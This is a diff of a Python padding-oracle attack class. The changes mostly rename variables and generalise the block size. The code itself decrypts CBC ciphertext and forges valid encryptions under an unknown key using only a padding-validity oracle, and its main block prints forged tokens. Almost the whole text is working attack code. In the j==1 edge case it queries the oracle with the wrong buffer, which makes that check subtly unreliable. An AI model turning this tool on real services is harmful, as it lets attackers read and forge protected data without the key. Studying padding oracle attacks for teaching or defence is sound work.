@@ -7,7 +7,7 @@ import random
 
 ##################################
 '''
-Author:  Les (L3st3r) Potter
+Author:  Les (l3st3r) Potter
 
 A Class to Decrypt and Encrypt using a Padding Oracle
 
@@ -63,16 +63,16 @@ class PaddingOracleCracker():
 
     def Encrypt(self, ST):
         # If we feed a  BLOCKSIZE'ed random byte string (CT) to f_decrypt_pkcs(),
-        # it will tell us the interim (I2) decrypted byte values based
+        # it will tell us the interim (PI) decrypted byte values based
         # on the unknown key.  It doesn't matter that the iterim is also
         # random, because it is the actual decrypted result for our chosen
         # random string.  The IV can be manipulated to make the make the
         # interim string be anything we like:
-        #   Note:   I2 xor PT == IV, and
-        #           I2 xor IV == PT
+        #   Note:   PI xor PT == IV, and
+        #           PI xor IV == PT
         #
-        # So, we compute an IV from our desired PT and the I2 from decryption
-        # above.  Then, CONCAT(IV,CT) will decrypt to PT.
+        # So, we compute an IVP from our desired PT and the PI from decryption
+        # (below).  Then, CONCAT(IV,CT) will decrypt to PT.
         #
         # This process can be repeated on any random block, even the IV
         # that we just computed!!  We can make the IV itself decrypt
@@ -81,25 +81,25 @@ class PaddingOracleCracker():
         # To encrypt an arbitrary string based on an unknown key using
         # a padding oracle: 
         # 1.  Define the string (ST) to encrypt.
-        # 2.  Pad it out according to PKCS#5 (PT)
+        # 2.  Pad it out according to PKCS#5/7 (PT)
         # 3.  Create an empty accumulator (CA)
         # 4.  Generate an arbitrary/random block (IV)
         # 5.  While there are more blocks in PT to encrypt...
         #       1. Push IV into front of the accumulator (CA.insert(0, IV))
         #       2. Set P to next (prior) block to encrypt
-        #       3. Generate I2 from DECRYPTOR(IV)
-        #       4. Compute new IV = I2 ^ P
+        #       3. Generate PI from DECRYPTOR(IV)
+        #       4. Compute new IV = PI ^ P
         # 6.  Push IV into front of the accumulator
         # 7.  Return the concatenation of the accumulator
         PT = self.f_addPad(ST)
         CA = []
-        IV = b''.join(self.f_genCPrime())
+        IV = b''.join(self.f_genIVPrime())
         while PT:
             CA.insert(0, IV)
             P = PT[-self.m_blockSize : ]
             PT = PT[ : -self.m_blockSize]
-            I2 = self.f_decrypt_pkcs(IV)
-            IV = PaddingOracleCracker.Xor(I2, P)
+            PI = self.f_decrypt_pkcs(IV)
+            IV = PaddingOracleCracker.Xor(PI, P)
         CA.insert(0, IV)
         ret = b''.join(CA)
         return ret
@@ -121,18 +121,18 @@ class PaddingOracleCracker():
             IVList.append(iv)
 
         # decrypt each block (C2) and xor with it's IV (i.e., C1)
-        PT = b''
-        PI = b''
+        plainText = b''
+        plainIntr = b''
         for C1, C2 in zip(IVList, CTList):
-            I2 = self.f_decrypt_pkcs(C2)
-            PT += PaddingOracleCracker.Xor(C1, I2)
-            PI += I2
+            PI = self.f_decrypt_pkcs(C2)
+            plainText += PaddingOracleCracker.Xor(C1, PI)
+            plainIntr += PI
 
         # return the Plain Text string with padding removed and with padding retained
-        return self.f_unPad(PT), PT
+        return self.f_unPad(plainText), plainText
 
-    def f_decrypt_pkcs(self, c2):
-        # This is a decryptor specific to PKCS#5.
+    def f_decrypt_pkcs(self, CT):
+        # This is a decryptor specific to PKCS#5/7.
         # Valid padding is a character representing the amount of padding
         # repeated (padding count) times. for example:
         #
@@ -143,7 +143,7 @@ class PaddingOracleCracker():
         #   xfffffffffffffff
         #   FFFFFFFFFFFFFFFF
         #
-        #   where F = 0x10
+        #   where F = 0x10 (16 decimal)
         #
         # There is always padding.  If a plain text string needs no
         # padding, the a full block of padding (last block in example)
@@ -152,20 +152,20 @@ class PaddingOracleCracker():
         # This internal decryptor expects a single self.m_blocksize string
         # to work on.
         
-        c1prime = self.f_genCPrime()         # make up a random prior block
-        i2 = [0] * self.m_blockSize   # initialize an empty interim block
+        IVP = self.f_genIVPrime()      # make up a random prior block
+        PI = [0] * self.m_blockSize   # initialize an empty interim block
 
         j = 1
         while j <= self.m_blockSize:
-            offt = 16-j
+            offt = self.m_blockSize - j
 
-            # prepare the c1prime for the next pass
+            # prepare the IVP for the next pass
             #  we use what we learned from previous passes to
             #  set the last PADDING-1 bytes of the buffer to 
             #  values that will decrypt to valid padding values.
             k = offt
             while k < self.m_blockSize - 1:
-                c1prime[k+1] = bytes([i2[k+1] ^ j])
+                IVP[k+1] = bytes([PI[k+1] ^ j])
                 k += 1
 
             # test every possible byte in the current position
@@ -174,45 +174,45 @@ class PaddingOracleCracker():
             #    oracle does not exist or is not 100% accurate)
             found = False
             for i in range(256):
-                c1prime[offt] = bytes([i])  # trial and error on the unknown position
+                IVP[offt] = bytes([i])  # trial and error on the unknown position
 
-                newcipherdata = b''.join(c1prime)          # add our test IV
-                newcipherdata += c2       # add encrypted text
+                newcipherdata = b''.join(IVP)          # add our test IV
+                newcipherdata += CT       # add encrypted text
 
                 # let the oracle decide
                 if self.m_oracle(newcipherdata):
                     #test for a special case when j==1
                     if j == 1:
                         l = j + 1
-                        lc1prime = c1prime[:]
-                        while l <= 16:
-                            lofft = 16 - l
-                            oldval = lc1prime[lofft]
-                            lc1prime[lofft] = bytes([lc1prime[lofft][0] ^ 1])
-                            lnewcipherdata = b''.join(lc1prime)
-                            lnewcipherdata += c2
+                        lIVP = IVP[:]
+                        while l <= self.m_blockSize:
+                            lofft = self.m_blockSize - l
+                            oldval = lIVP[lofft]
+                            lIVP[lofft] = bytes([lIVP[lofft][0] ^ 1])
+                            lnewcipherdata = b''.join(lIVP)
+                            lnewcipherdata += CT
                             if self.m_oracle(newcipherdata):
                                 break; 
-                            lc1prime[lofft] = bytes([lc1prime[lofft][0] ^ 1])
+                            lIVP[lofft] = bytes([lIVP[lofft][0] ^ 1])
                             l += 1
                         m = j
                         while m < l:
-                            mofft = 16-m
-                            i2[mofft] = c1prime[mofft][0] ^ (l-1)
+                            mofft = self.m_blockSize - m
+                            PI[mofft] = IVP[mofft][0] ^ (l-1)
                             m += 1
                         j = l-1
                     else:
-                        i2[offt] = i ^ j       
+                        PI[offt] = i ^ j       
                     found = True
                     break
             if not found:
                 raise PaddingOracleException("oracle failed")
             j += 1
             
-        i2s = b''.join([bytes([c]) for c in i2])
-        return i2s
+        PIs = b''.join([bytes([c]) for c in PI])
+        return PIs
 
-    def f_genCPrime(self):
+    def f_genIVPrime(self):
         # generate a BLOCKSIZE'd random array of bytes
         cp = []
         while len(cp) < self.m_blockSize:
@@ -279,3 +279,4 @@ if __name__ == "__main__":
     print(toWeb64(poc.Encrypt(b"abcdefabcd")))
     print(toWeb64(poc.Encrypt(b"abcdefabcde")))
     print(toWeb64(poc.Encrypt(b"abcdefabcdef")))
+    
